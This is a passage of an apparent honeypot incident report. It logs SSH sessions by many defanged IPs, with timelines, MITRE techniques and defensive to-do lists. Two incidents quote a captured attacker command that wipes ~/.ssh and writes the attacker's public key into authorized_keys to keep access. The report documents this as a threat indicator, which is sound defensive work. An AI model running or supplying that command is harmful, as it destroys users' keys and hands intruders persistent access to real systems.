| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:31:47` | `cowrie.session.connect` |
| `2026-07-14 19:31:48` | `cowrie.client.version` |
| `2026-07-14 19:31:48` | `cowrie.client.kex` |
| `2026-07-14 19:31:49` | `cowrie.login.success` |
| `2026-07-14 19:31:49` | `cowrie.direct-tcpip.request` |
| `2026-07-14 19:31:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.192.226[.]83` to AbuseIPDB if not already reported
- [ ] Block `62.192.226[.]83` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82d9c5e5b632

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-14 19:32 |
| **Last Seen** | 2026-07-14 19:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:32:48` | `cowrie.session.connect` |
| `2026-07-14 19:32:48` | `cowrie.client.version` |
| `2026-07-14 19:32:48` | `cowrie.client.kex` |
| `2026-07-14 19:32:51` | `cowrie.login.success` |
| `2026-07-14 19:32:52` | `cowrie.session.params` |
| `2026-07-14 19:32:52` | `cowrie.command.input` |
| `2026-07-14 19:32:52` | `cowrie.log.closed` |
| `2026-07-14 19:32:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c90f4df22990

| Field | Detail |
|---|---|
| **Source IP** | `136.56.34[.]147` |
| **First Seen** | 2026-07-14 19:33 |
| **Last Seen** | 2026-07-14 19:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:33:47` | `cowrie.session.connect` |
| `2026-07-14 19:33:47` | `cowrie.client.version` |
| `2026-07-14 19:33:47` | `cowrie.client.kex` |
| `2026-07-14 19:33:48` | `cowrie.login.success` |
| `2026-07-14 19:33:48` | `cowrie.direct-tcpip.request` |
| `2026-07-14 19:33:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.56.34[.]147` to AbuseIPDB if not already reported
- [ ] Block `136.56.34[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a774901c2e3

| Field | Detail |
|---|---|
| **Source IP** | `106.92.55[.]35` |
| **First Seen** | 2026-07-14 19:45 |
| **Last Seen** | 2026-07-14 19:50 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:45:13` | `cowrie.session.connect` |
| `2026-07-14 19:45:14` | `cowrie.client.version` |
| `2026-07-14 19:45:14` | `cowrie.client.kex` |
| `2026-07-14 19:45:15` | `cowrie.login.success` |
| `2026-07-14 19:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.92.55[.]35` to AbuseIPDB if not already reported
- [ ] Block `106.92.55[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f01ece44c17d

| Field | Detail |
|---|---|
| **Source IP** | `117.34.85[.]169` |
| **First Seen** | 2026-07-14 19:45 |
| **Last Seen** | 2026-07-14 19:50 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:45:26` | `cowrie.session.connect` |
| `2026-07-14 19:45:26` | `cowrie.client.version` |
| `2026-07-14 19:45:26` | `cowrie.client.kex` |
| `2026-07-14 19:45:27` | `cowrie.login.success` |
| `2026-07-14 19:45:28` | `cowrie.session.params` |
| `2026-07-14 19:45:28` | `cowrie.command.input` |
| `2026-07-14 19:45:28` | `cowrie.command.failed` |
| `2026-07-14 19:45:29` | `cowrie.log.closed` |
| `2026-07-14 19:45:30` | `cowrie.session.params` |
| `2026-07-14 19:45:30` | `cowrie.command.input` |
| `2026-07-14 19:50:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.34.85[.]169` to AbuseIPDB if not already reported
- [ ] Block `117.34.85[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1cc23b583e2

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-14 19:49 |
| **Last Seen** | 2026-07-14 19:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:49:47` | `cowrie.session.connect` |
| `2026-07-14 19:49:47` | `cowrie.client.version` |
| `2026-07-14 19:49:47` | `cowrie.client.kex` |
| `2026-07-14 19:49:47` | `cowrie.login.success` |
| `2026-07-14 19:49:48` | `cowrie.session.params` |
| `2026-07-14 19:49:48` | `cowrie.command.input` |
| `2026-07-14 19:49:48` | `cowrie.log.closed` |
| `2026-07-14 19:49:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ad286ccacad

| Field | Detail |
|---|---|
| **Source IP** | `103.72.147[.]224` |
| **First Seen** | 2026-07-14 19:51 |
| **Last Seen** | 2026-07-14 19:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept: */*` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:51:32` | `cowrie.session.connect` |
| `2026-07-14 19:51:32` | `cowrie.login.success` |
| `2026-07-14 19:51:33` | `cowrie.session.params` |
| `2026-07-14 19:51:33` | `cowrie.command.input` |
| `2026-07-14 19:51:33` | `cowrie.command.failed` |
| `2026-07-14 19:51:33` | `cowrie.command.input` |
| `2026-07-14 19:51:33` | `cowrie.log.closed` |
| `2026-07-14 19:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.72.147[.]224` to AbuseIPDB if not already reported
- [ ] Block `103.72.147[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebddd564be6e

| Field | Detail |
|---|---|
| **Source IP** | `95.79.57[.]221` |
| **First Seen** | 2026-07-14 19:55 |
| **Last Seen** | 2026-07-14 19:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:55:08` | `cowrie.session.connect` |
| `2026-07-14 19:55:09` | `cowrie.client.version` |
| `2026-07-14 19:55:09` | `cowrie.client.kex` |
| `2026-07-14 19:55:10` | `cowrie.login.success` |
| `2026-07-14 19:55:10` | `cowrie.direct-tcpip.request` |
| `2026-07-14 19:55:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.79.57[.]221` to AbuseIPDB if not already reported
- [ ] Block `95.79.57[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-985a875c57e8

| Field | Detail |
|---|---|
| **Source IP** | `182.156.35[.]238` |
| **First Seen** | 2026-07-14 19:55 |
| **Last Seen** | 2026-07-14 19:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:55:43` | `cowrie.session.connect` |
| `2026-07-14 19:55:44` | `cowrie.client.version` |
| `2026-07-14 19:55:44` | `cowrie.client.kex` |
| `2026-07-14 19:55:45` | `cowrie.login.success` |
| `2026-07-14 19:55:46` | `cowrie.direct-tcpip.request` |
| `2026-07-14 19:55:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.35[.]238` to AbuseIPDB if not already reported
- [ ] Block `182.156.35[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c12c5c9c871b

| Field | Detail |
|---|---|
| **Source IP** | `101.13.1[.]58` |
| **First Seen** | 2026-07-14 19:55 |
| **Last Seen** | 2026-07-14 19:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:55:56` | `cowrie.session.connect` |
| `2026-07-14 19:55:56` | `cowrie.client.version` |
| `2026-07-14 19:55:56` | `cowrie.client.kex` |
| `2026-07-14 19:55:59` | `cowrie.login.success` |
| `2026-07-14 19:55:59` | `cowrie.direct-tcpip.request` |
| `2026-07-14 19:56:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.1[.]58` to AbuseIPDB if not already reported
- [ ] Block `101.13.1[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e06d59788096

| Field | Detail |
|---|---|
| **Source IP** | `39.164.94[.]190` |
| **First Seen** | 2026-07-14 19:56 |
| **Last Seen** | 2026-07-14 19:57 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:56:56` | `cowrie.session.connect` |
| `2026-07-14 19:56:57` | `cowrie.client.version` |
| `2026-07-14 19:56:57` | `cowrie.client.kex` |
| `2026-07-14 19:57:00` | `cowrie.login.success` |
| `2026-07-14 19:57:01` | `cowrie.direct-tcpip.request` |
| `2026-07-14 19:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.164.94[.]190` to AbuseIPDB if not already reported
- [ ] Block `39.164.94[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3005062cdf1f

| Field | Detail |
|---|---|
| **Source IP** | `70.120.203[.]193` |
| **First Seen** | 2026-07-14 19:58 |
| **Last Seen** | 2026-07-14 19:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:58:12` | `cowrie.session.connect` |
| `2026-07-14 19:58:12` | `cowrie.client.version` |
| `2026-07-14 19:58:12` | `cowrie.client.kex` |
| `2026-07-14 19:58:12` | `cowrie.login.success` |
| `2026-07-14 19:58:13` | `cowrie.session.params` |
| `2026-07-14 19:58:13` | `cowrie.command.input` |
| `2026-07-14 19:58:13` | `cowrie.command.failed` |
| `2026-07-14 19:58:13` | `cowrie.log.closed` |
| `2026-07-14 19:58:14` | `cowrie.session.params` |
| `2026-07-14 19:58:14` | `cowrie.command.input` |
| `2026-07-14 19:58:14` | `cowrie.session.file_download` |
| `2026-07-14 19:58:14` | `cowrie.log.closed` |
| `2026-07-14 19:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.120.203[.]193` to AbuseIPDB if not already reported
- [ ] Block `70.120.203[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-369f038907ac

| Field | Detail |
|---|---|
| **Source IP** | `70.120.203[.]193` |
| **First Seen** | 2026-07-14 19:58 |
| **Last Seen** | 2026-07-14 19:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:58:14` | `cowrie.session.connect` |
| `2026-07-14 19:58:14` | `cowrie.client.version` |
| `2026-07-14 19:58:14` | `cowrie.client.kex` |
| `2026-07-14 19:58:14` | `cowrie.login.success` |
| `2026-07-14 19:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.120.203[.]193` to AbuseIPDB if not already reported
- [ ] Block `70.120.203[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f7d29e4e712

| Field | Detail |
|---|---|
| **Source IP** | `70.120.203[.]193` |
| **First Seen** | 2026-07-14 19:58 |
| **Last Seen** | 2026-07-14 19:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:58:14` | `cowrie.session.connect` |
| `2026-07-14 19:58:14` | `cowrie.client.version` |
| `2026-07-14 19:58:14` | `cowrie.client.kex` |
| `2026-07-14 19:58:14` | `cowrie.login.success` |
| `2026-07-14 19:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.120.203[.]193` to AbuseIPDB if not already reported
- [ ] Block `70.120.203[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d167f62f4b1

| Field | Detail |
|---|---|
| **Source IP** | `60.166.8[.]174` |
| **First Seen** | 2026-07-14 19:58 |
| **Last Seen** | 2026-07-14 19:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:58:30` | `cowrie.session.connect` |
| `2026-07-14 19:58:31` | `cowrie.client.version` |
| `2026-07-14 19:58:31` | `cowrie.client.kex` |
| `2026-07-14 19:58:33` | `cowrie.login.success` |
| `2026-07-14 19:58:34` | `cowrie.direct-tcpip.request` |
| `2026-07-14 19:58:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.166.8[.]174` to AbuseIPDB if not already reported
- [ ] Block `60.166.8[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-428e1f245f5a

| Field | Detail |
|---|---|
| **Source IP** | `122.166.253[.]226` |
| **First Seen** | 2026-07-14 19:59 |
| **Last Seen** | 2026-07-14 19:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 19:59:14` | `cowrie.session.connect` |
| `2026-07-14 19:59:14` | `cowrie.client.version` |
| `2026-07-14 19:59:14` | `cowrie.client.kex` |
| `2026-07-14 19:59:16` | `cowrie.login.success` |
| `2026-07-14 19:59:17` | `cowrie.direct-tcpip.request` |
| `2026-07-14 19:59:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.166.253[.]226` to AbuseIPDB if not already reported
- [ ] Block `122.166.253[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e86004324d7e

| Field | Detail |
|---|---|
| **Source IP** | `175.207.233[.]24` |
| **First Seen** | 2026-07-14 20:00 |
| **Last Seen** | 2026-07-14 20:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:00:30` | `cowrie.session.connect` |
| `2026-07-14 20:00:31` | `cowrie.client.version` |
| `2026-07-14 20:00:31` | `cowrie.client.kex` |
| `2026-07-14 20:00:34` | `cowrie.login.success` |
| `2026-07-14 20:00:35` | `cowrie.direct-tcpip.request` |
| `2026-07-14 20:00:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.207.233[.]24` to AbuseIPDB if not already reported
- [ ] Block `175.207.233[.]24` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de1abe676852

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]92` |
| **First Seen** | 2026-07-14 20:15 |
| **Last Seen** | 2026-07-14 20:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:15:26` | `cowrie.session.connect` |
| `2026-07-14 20:15:26` | `cowrie.client.version` |
| `2026-07-14 20:15:26` | `cowrie.client.kex` |
| `2026-07-14 20:15:26` | `cowrie.login.success` |
| `2026-07-14 20:15:27` | `cowrie.session.params` |
| `2026-07-14 20:15:27` | `cowrie.command.input` |
| `2026-07-14 20:15:27` | `cowrie.log.closed` |
| `2026-07-14 20:15:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]92` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4d71058d1a2

| Field | Detail |
|---|---|
| **Source IP** | `41.231.85[.]75` |
| **First Seen** | 2026-07-14 20:20 |
| **Last Seen** | 2026-07-14 20:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:20:39` | `cowrie.session.connect` |
| `2026-07-14 20:20:40` | `cowrie.client.version` |
| `2026-07-14 20:20:40` | `cowrie.client.kex` |
| `2026-07-14 20:20:41` | `cowrie.login.success` |
| `2026-07-14 20:20:41` | `cowrie.direct-tcpip.request` |
| `2026-07-14 20:20:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.231.85[.]75` to AbuseIPDB if not already reported
- [ ] Block `41.231.85[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bb24e679e7c

| Field | Detail |
|---|---|
| **Source IP** | `121.179.93[.]147` |
| **First Seen** | 2026-07-14 20:20 |
| **Last Seen** | 2026-07-14 20:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:20:47` | `cowrie.session.connect` |
| `2026-07-14 20:20:47` | `cowrie.client.version` |
| `2026-07-14 20:20:47` | `cowrie.client.kex` |
| `2026-07-14 20:20:50` | `cowrie.login.success` |
| `2026-07-14 20:20:50` | `cowrie.direct-tcpip.request` |
| `2026-07-14 20:20:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.179.93[.]147` to AbuseIPDB if not already reported
- [ ] Block `121.179.93[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69086e1ab297

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-14 20:21 |
| **Last Seen** | 2026-07-14 20:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:21:58` | `cowrie.session.connect` |
| `2026-07-14 20:21:58` | `cowrie.client.version` |
| `2026-07-14 20:21:58` | `cowrie.client.kex` |
| `2026-07-14 20:21:58` | `cowrie.login.success` |
| `2026-07-14 20:21:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bfefefd7949

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-14 20:21 |
| **Last Seen** | 2026-07-14 20:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:21:58` | `cowrie.session.connect` |
| `2026-07-14 20:21:58` | `cowrie.client.version` |
| `2026-07-14 20:21:58` | `cowrie.client.kex` |
| `2026-07-14 20:21:59` | `cowrie.login.success` |
| `2026-07-14 20:21:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e040cdd06beb

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-14 20:21 |
| **Last Seen** | 2026-07-14 20:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:21:59` | `cowrie.session.connect` |
| `2026-07-14 20:21:59` | `cowrie.client.version` |
| `2026-07-14 20:21:59` | `cowrie.client.kex` |
| `2026-07-14 20:21:59` | `cowrie.login.success` |
| `2026-07-14 20:21:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7820ea8fc503

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-14 20:22 |
| **Last Seen** | 2026-07-14 20:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:22:09` | `cowrie.session.connect` |
| `2026-07-14 20:22:09` | `cowrie.client.version` |
| `2026-07-14 20:22:09` | `cowrie.client.kex` |
| `2026-07-14 20:22:09` | `cowrie.login.success` |
| `2026-07-14 20:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84be0b229868

| Field | Detail |
|---|---|
| **Source IP** | `119.200.229[.]33` |
| **First Seen** | 2026-07-14 20:22 |
| **Last Seen** | 2026-07-14 20:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-14 20:22:24` | `cowrie.session.connect` |
| `2026-07-14 20:22:25` | `cowrie.client.version` |
| `2026-07-14 20:22:25` | `cowrie.client.kex` |
| `2026-07-14 20:22:27` | `cowrie.login.success` |
| `2026-07-14 20:22:27` | `cowrie.direct-tcpip.request` |
| `2026-07-14 20:22:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.200.229[.]33` to AbuseIPDB if not already reported
- [ ] Block `119.200.229[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb52b401735c

| Field | Detail |
|---|---|
| **Source IP** | `36.93.154[.]207` |
| **First Seen** | 2026-07-14 20:22 |
| **Last Seen** | 2026-07-14 20:22 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
